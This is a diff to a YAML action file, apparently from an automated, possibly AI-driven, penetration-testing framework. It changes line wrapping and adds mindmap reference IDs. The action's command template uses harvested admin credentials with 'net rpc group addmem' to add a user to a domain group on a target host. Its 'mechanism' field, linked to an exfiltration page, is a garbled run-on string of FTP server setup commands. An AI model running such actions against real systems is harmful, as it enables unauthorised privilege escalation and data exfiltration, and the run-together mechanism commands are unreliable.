@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: net rpc group addmem '{group}' '{username}' -U '{domain}/{admin_user}%{password}'
-  -S {target_ip}
+command_template: net rpc group addmem '{group}' '{username}' -U '{domain}/{admin_user}%{password}' -S {target_ip}
 parser: generic_parser
 expected_effects:
 - action_completed
@@ -15,7 +14,23 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: apt-get update && apt-get install pure-ftp groupadd ftpgroup useradd -g
-  ftpgroup -d /dev/null -s /etc ftpuser pure-pwd useradd fusr -u ftpuser -d /ftphome
-  pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ..
+mechanism: apt-get update && apt-get install pure-ftp groupadd ftpgroup useradd -g ftpgroup -d /dev/null -s /etc ftpuser pure-pwd
+  useradd fusr -u ftpuser -d /ftphome pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ..
 hacktricks_ref: generic-hacking/exfiltration.md
+references:
+  ocd_mindmap_node_ids:
+  - 0ef4f9b41a
+  - 124842a830
+  - 1f3b554cec
+  - 392aec8c33
+  - 60ffc3bc37
+  - 82143b673e
+  - 84bce461c5
+  - 8f9f33e7f5
+  - 9d09efd73c
+  - b3e8cc1f1f
+  - b5045c422f
+  - c73e87dca6
+  - e1dfc78388
+  - f2e47f9099
+  - fe0000e971
